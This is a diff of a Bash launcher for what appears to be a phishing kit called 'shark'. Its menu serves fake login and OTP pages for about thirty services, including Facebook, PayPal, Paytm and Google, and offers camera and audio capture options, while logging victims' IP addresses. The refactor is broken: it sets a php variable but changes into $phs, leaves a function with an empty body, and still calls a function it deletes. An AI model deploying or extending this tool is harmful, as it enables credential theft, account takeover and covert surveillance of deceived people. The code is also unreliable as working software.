@@ -43,9 +43,37 @@ BIN="${PREFIX}/bin"
 ################
 
 msg() {
-	printf "${blue}[-] ${green}${1}\n${nc}"
+	printf "${blue}[ - ] ${green}${1}\n${nc}"
 }
 
+norm_msg() {
+	printf "${green}${1}\n${nc}"
+}
+
+error_msg() {
+        printf "${red}[ ! ] ${white}${1}\n${nc}"
+}
+
+
+#####
+# OS
+#####
+
+function os () {
+if [ -e $BIN/termux-info ]; then
+		php="${PREFIX}/share/phs"
+		files="/sdcard"
+		OS=TERMUX
+	else
+	        php="/usr/share/phs"
+		files="$HOME/Desktop"
+		OS=DEBIAN 
+fi
+}
+
+function main_update() {
+###
+}
 function update() {
 	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutrials/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
@@ -152,82 +180,12 @@ while true; do
 done
 
 
-clear
-echo ""
-echo ""
-echo -e "\e[32m                ============================================\e[m "
-echo -e "\e[31m                [\e[32m★\e[31m]\e[93m Follow us on youtube:bhaviktutorials\e[31m [\e[32m★\e[31m]\e[m "
-echo -e "\e[32m                ============================================\e[m " 
-
-
-#shark logo
-shark_logo() {
-clear
-echo -e "\e[92m
-SHARK ©\e[34m
-                               8b
-                               88b
-                               888b
-                               8888b
-                               88888b
-                               888888b
-                             .d88888888b.__
-                       _.od888888888888888888boo..._
-                   .od8888888888888888888888888888888booo.._
-                .od888888888888888888888888888888888888888888\)
-              .d888P\'    \"Y88888888888888888888(_   _ )888P\"\'
-            .d8888Poo.     \`Y88888888888888888P-.\`-\`@\'.-\'\"\"-.
-   .oooooood8888888P\"\"\'     \`\"Y8888888P.d888P   \`---\'\"\"\"\".-\'
- d888888888'888P\'  _...-----..__      \'d88888__...------\'
- \`\"\"Y88888\'8888|-\'              \`----\'|88888P
-         \`Y8888b                       Y888P
-          888888b                       \`\"\'
-           Y88888
-           jgs/VK  \`Y88P
-           YP\e[m"
-}
-
-
-echo 
-echo 
-echo -e "\e[31m[\e[32m★\e[31m]\e[32m CONNECT TO STABLE INTERNET CONNECTION\e[m "
-sleep 2
-echo 
-echo 
-echo -en "\e[31m[\e[32m*\e[31m]\e[32m HAVE YOU CONNECTED TO IT (y/n)? \e[m "
-read ans
-if [ "$ans" != "${ans#[Yy]}" ]; then
-echo 
-echo 
-echo -e "\e[92m>>\e[96m BEST PHISHING TOOL \e[m "
-tput civis
-sleep 4
-tput cnorm
-else 
-exit
-fi
-
-#file_check Camera
+# CHECK FILE 
 #check for i in instead of if else
 
 file_check() {
-if [ -d "${files}/Camera_hack" ]
-then
-echo
-else 
-mkdir -p ${files}/Camera_hack
-fi
-}
-
-#file_check1 Audio 
-
-file_check1() {
-if [ -d "${files}/Audio_hack" ]
-then
-echo
-else 
-mkdir -p ${files}/Audio_hack
-fi
+[ ! -d "${files}/Camera_hack" ] && mkdir -p ${files}/Camera_hack
+[ ! -d "${files}/Audio_hack" ] && mkdir -p ${files}/Audio_hack
 }
 
 #catch_ip camera
@@ -235,7 +193,7 @@ fi
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "${green}[${white}+${green}] ${yellow}IP:${white} %s ${nc} \n" $ip
 cat ip.txt >> saved.ip.txt
 }
 
@@ -367,11 +325,11 @@ ash() {
 #####
 function os () {
 if [ -e $BIN/termux-info ]; then
-		BINDIR="${PREFIX}/bin/phs"
+		php="${PREFIX}/share/phs"
 		files="/sdcard"
 		OS=TERMUX
 	else
-	        BINDIR="/usr/bin/phs"
+	        php="/usr/share/phs"
 		files="$HOME/Desktop"
 		OS=DEBIAN 
 fi
@@ -436,7 +394,7 @@ echo
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
-	                    cd $BINDIR/facebook/                            
+	                    cd $phs/facebook/                            
                             echo 
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
@@ -468,7 +426,7 @@ echo
 			     
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
-			   cd $BINDIR/pinterest/                           
+			   cd $phs/pinterest/                           
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -499,7 +457,7 @@ echo
 
 	 elif [ $option = 03 ] || [ $option = 3 ]
 	 then
-		           cd $BINDIR/instagram/
+		           cd $phs/instagram/
 			   echo 
 			   connection
 			   ( sleep 5 ) &> /dev/null & spin_shark
@@ -530,7 +488,7 @@ echo
 			   
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
-                          cd $BINDIR/UberEats-Phishing/
+                          cd $phs/UberEats-Phishing/
 			  echo 
 			  connection
 			  ( sleep 5 ) &> /dev/null & spin_shark
@@ -561,7 +519,7 @@ echo
 			  
         elif [ $option = 05 ] || [ $option = 5 ]
         then
-                          cd $BINDIR/ola-otpbypass/
+                          cd $phs/ola-otpbypass/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -592,7 +550,7 @@ echo
 			  
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
-                          cd $BINDIR/google-otp/                         
+                          cd $phs/google-otp/                         
                           echo 
 			  connection
 		          ( sleep 5 ) &> /dev/null & spin_shark  
@@ -623,7 +581,7 @@ echo
 			  
        elif [ $option = 07 ] || [ $option = 7 ]
        then
-                          cd $BINDIR/Paytm-Phishing/
+                          cd $phs/Paytm-Phishing/
                           echo 
                           echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
 			  echo
@@ -694,7 +652,7 @@ echo
         elif [ $option = 08 ] || [ $option = 8 ]
 	then
 
-                          cd $BINDIR/Netflix/
+                          cd $phs/Netflix/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -725,7 +683,7 @@ echo
 
            elif [ $option = 09 ] || [ $option = 9 ]
 	   then
-                           cd $BINDIR/instafollow/
+                           cd $phs/instafollow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -756,7 +714,7 @@ echo
 			   
                elif [ $option = 10 ]
 	       then
-                           cd $BINDIR/amazonsign/
+                           cd $phs/amazonsign/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -787,7 +745,7 @@ echo
 
                   elif [ $option = 11 ]
 	          then
-                           cd $BINDIR/whatsapp-phishing/
+                           cd $phs/whatsapp-phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -818,7 +776,7 @@ echo
 			   
 	          elif [ $option = 12 ]
 	          then
-                           cd $BINDIR/Linkedin/
+                           cd $phs/Linkedin/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -849,7 +807,7 @@ echo
    
                      elif [ $option = 13 ]
 	             then
-                           cd $BINDIR/Hotstar-otp-bypass/
+                           cd $phs/Hotstar-otp-bypass/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -880,7 +838,7 @@ echo
       
                     elif [ $option = 14 ]
 	            then
-                           cd $BINDIR/spotify/
+                           cd $phs/spotify/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -911,7 +869,7 @@ echo
 			   
 	            elif [ $option = 15 ]
 	            then
-                           cd $BINDIR/github/
+                           cd $phs/github/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -942,7 +900,7 @@ echo
 			   
 	        elif [ $option = 16 ]
 	        then
-                           cd $BINDIR/ipfinder/
+                           cd $phs/ipfinder/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -973,7 +931,7 @@ echo
 
                   elif [ $option = 17 ]
 	          then
-                           cd $BINDIR/Zomato-Phishing/
+                           cd $phs/Zomato-Phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1004,7 +962,7 @@ echo
 
                    elif [ $option = 18 ]
 	           then
-                           cd $BINDIR/phonepay/
+                           cd $phs/phonepay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1035,7 +993,7 @@ echo
 			   
 	            elif [ $option = 19 ]
 	            then
-                           cd $BINDIR/paypal/
+                           cd $phs/paypal/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1066,7 +1024,7 @@ echo
            
 	            elif [ $option = 20 ]
 	            then
-                           cd $BINDIR/telegram/
+                           cd $phs/telegram/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1097,7 +1055,7 @@ echo
 			   
 	            elif [ $option = 21 ]
 	            then
-                           cd $BINDIR/twitter/
+                           cd $phs/twitter/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1128,7 +1086,7 @@ echo
                     
 		    elif [ $option = 22 ]
 	            then
-                          cd $BINDIR/flipcart/
+                          cd $phs/flipcart/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1159,7 +1117,7 @@ echo
        
                   elif [ $option = 23 ]
 	          then
-                          cd $BINDIR/wordpress/
+                          cd $phs/wordpress/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1190,7 +1148,7 @@ echo
 			  
 	           elif [ $option = 24 ]
 	           then
-                           cd $BINDIR/snapchat/
+                           cd $phs/snapchat/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1221,7 +1179,7 @@ echo
 			   
 		    elif [ $option = 25 ]
 	            then
-                           cd $BINDIR/protonmail/
+                           cd $phs/protonmail/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1252,7 +1210,7 @@ echo
 
                   elif [ $option = 26 ]
 	          then
-                           cd $BINDIR/stackoverflow/
+                           cd $phs/stackoverflow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1283,7 +1241,7 @@ echo
 
                   elif [ $option = 27 ]
 	          then
-                           cd $BINDIR/ebay/
+                           cd $phs/ebay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1314,7 +1272,7 @@ echo
 
                   elif [ $option = 28 ]
 	          then
-                           cd $BINDIR/twitch/
+                           cd $phs/twitch/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1345,7 +1303,7 @@ echo
                 
 		    elif [ $option = 29 ]
 	            then
-                           cd $BINDIR/ajio/
+                           cd $phs/ajio/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1376,7 +1334,7 @@ echo
 			   
 		  elif [ $option = 30 ]
 	          then               
-                           cd $BINDIR/mobikwik/
+                           cd $phs/mobikwik/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1408,7 +1366,7 @@ echo
 		  elif [ $option = 31 ]
 	          then        
 		           
-		           cd $BINDIR/Camera_hack
+		           cd $phs/Camera_hack
 			   file_check
 			   echo
 			   clear
@@ -1496,7 +1454,7 @@ echo
 			   
 	           elif [ $option = 32 ]
 	           then 
-		            cd $BINDIR/Audio_hack
+		            cd $phs/Audio_hack
 		            file_check1
 			    echo
 			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
